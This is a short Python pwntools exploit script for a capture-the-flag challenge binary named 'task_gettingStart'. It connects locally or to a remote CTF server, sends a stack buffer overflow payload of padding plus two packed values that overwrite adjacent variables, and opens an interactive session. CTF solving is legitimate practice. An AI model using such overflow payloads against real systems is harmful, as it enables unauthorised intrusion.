#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./task_gettingStart_ktQeERc"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("49.4.95.5",30048)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

debug()


payload = "a"*0x18 + p64(0x7FFFFFFFFFFFFFFF)+p64(0x3fb999999999999a) #p64((-1717986918)&0xffffffffffffffff)#+chr(00)+ chr(0x0f)+chr(0xef)+chr(0x7f)+chr(0xff )+chr(0xff)+chr(0xff) + chr(0xff)


r.send(payload)
r.interactive()
